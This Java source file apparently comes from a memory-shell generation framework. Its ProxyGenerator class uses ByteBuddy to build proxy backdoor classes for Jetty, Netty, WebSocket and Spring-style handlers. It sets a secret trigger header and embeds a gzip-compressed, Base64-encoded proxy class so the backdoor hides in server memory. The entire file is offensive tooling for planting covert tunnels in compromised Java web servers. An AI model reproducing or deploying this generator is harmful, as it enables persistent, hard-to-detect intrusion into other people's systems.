package com.reajason.javaweb.memshell.shelltool.proxy;

import com.reajason.javaweb.ClassBytesShrink;
import com.reajason.javaweb.buddy.TargetJreVersionVisitorWrapper;
import com.reajason.javaweb.memshell.config.ShellConfig;
import com.reajason.javaweb.memshell.generator.ByteBuddyShellGenerator;
import com.reajason.javaweb.utils.Base64Utils;
import com.reajason.javaweb.utils.CommonUtil;
import net.bytebuddy.ByteBuddy;
import net.bytebuddy.dynamic.DynamicType;

import static net.bytebuddy.matcher.ElementMatchers.named;

public class ProxyGenerator extends ByteBuddyShellGenerator<ProxyConfig> {
    public ProxyGenerator(ShellConfig shellConfig, ProxyConfig shellToolConfig) {
        super(shellConfig, shellToolConfig);
    }

    @Override
    protected DynamicType.Builder<?> getBuilder() {
        String template = shellToolConfig.getShellTemplateClassName();
        if (ProxyHttp.class.getName().equals(template)) {
            return withHeaders(redefineTemplate());
        }
        if (ProxyWebSocket.class.getName().equals(template)
                || ProxyRawWebSocket.class.getName().equals(template)) {
            return redefineTemplate();
        }
        try (DynamicType.Unloaded<ProxyHttp> unloaded = new ByteBuddy()
                .redefine(ProxyHttp.class)
                .name(CommonUtil.generateClassName())
                .field(named("headerName")).value(shellToolConfig.getHeaderName())
                .field(named("headerValue")).value(shellToolConfig.getHeaderValue())
                .visit(new TargetJreVersionVisitorWrapper(getTargetJreVersion()))
                .make()) {
            byte[] shrinkBytes = ClassBytesShrink.shrink(unloaded.getBytes(), true);
            DynamicType.Builder<?> builder = redefineTemplate().field(named("proxyHttpGZipBase64"))
                    .value(Base64Utils.encodeBase64String(CommonUtil.gzipCompress(shrinkBytes)));
            if (hasIndependentRequestMatcher(template)) {
                builder = withHeaders(builder);
            }
            return builder;
        }
    }

    private DynamicType.Builder<?> withHeaders(DynamicType.Builder<?> builder) {
        return builder.field(named("headerName")).value(shellToolConfig.getHeaderName())
                .field(named("headerValue")).value(shellToolConfig.getHeaderValue());
    }

    private static boolean hasIndependentRequestMatcher(String template) {
        return ProxyJettyHandler.class.getName().equals(template)
                || ProxyNettyHandler.class.getName().equals(template)
                || ProxyWebFilter.class.getName().equals(template)
                || ProxyHandlerFunction.class.getName().equals(template)
                || ProxyHandlerMethod.class.getName().equals(template);
    }
}
